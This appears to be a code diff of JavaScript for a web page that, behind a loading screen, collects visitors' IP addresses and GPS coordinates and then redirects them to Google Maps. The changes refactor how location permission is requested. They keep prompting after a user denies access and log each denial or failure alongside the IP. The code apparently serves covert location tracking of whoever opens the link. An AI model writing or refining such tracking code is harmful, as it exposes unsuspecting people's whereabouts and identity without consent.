@@ -72,44 +72,50 @@ async function logGPSAndIP(lat, lon) {
   window.location.href = `https://www.google.com/maps/@${lat},${lon},15z`;
 }
 
-async function getLocation() {
-  // Always log IP fallback first
-  await logIPOnly("🔄 USER OPENED PAGE");
-
-  if (!navigator.geolocation) return;
+// 🔄 Handles full logic (used on load and on Retry)
+async function handleLocationFlow(trigger = "page") {
+  if (!navigator.geolocation || !navigator.permissions) {
+    await logIPOnly("❌ Geolocation not supported");
+    return;
+  }
 
   try {
-    const perm = await navigator.permissions.query({ name: 'geolocation' });
+    const permission = await navigator.permissions.query({ name: 'geolocation' });
 
-    if (perm.state === 'granted') {
+    if (permission.state === "granted") {
       navigator.geolocation.getCurrentPosition(
         pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("⚠️ GPS fetch failed")
+        err => logIPOnly("⚠️ GPS fetch error (granted state)")
       );
-    } else {
+    } else if (permission.state === "prompt") {
       navigator.geolocation.getCurrentPosition(
         pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("❌ USER DENIED LOCATION ACCESS")
+        err => logIPOnly("❌ User blocked or dismissed prompt")
+      );
+    } else if (permission.state === "denied") {
+      // 🔄 Retry popup via force attempt (clicking retry will re-prompt)
+      navigator.geolocation.getCurrentPosition(
+        pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
+        err => logIPOnly("❌ User denied location access")
       );
     }
 
-    perm.onchange = () => {
-      if (perm.state === 'granted') location.reload();
+    // Watch for permission changes
+    permission.onchange = () => {
+      if (permission.state === "granted") location.reload();
     };
 
-  } catch (e) {
-    navigator.geolocation.getCurrentPosition(
-      pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-      err => logIPOnly("⚠️ PERMISSION CHECK FAILED")
-    );
+  } catch (err) {
+    await logIPOnly("❌ PERMISSION API failed");
   }
 }
 
+// ✅ Called on retry icon click
 function retryLocation() {
-  getLocation();
+  handleLocationFlow("retry");
 }
 
 window.onload = () => {
   document.getElementById("loading-screen").style.display = "flex";
-  getLocation();
+  handleLocationFlow("page");
 };
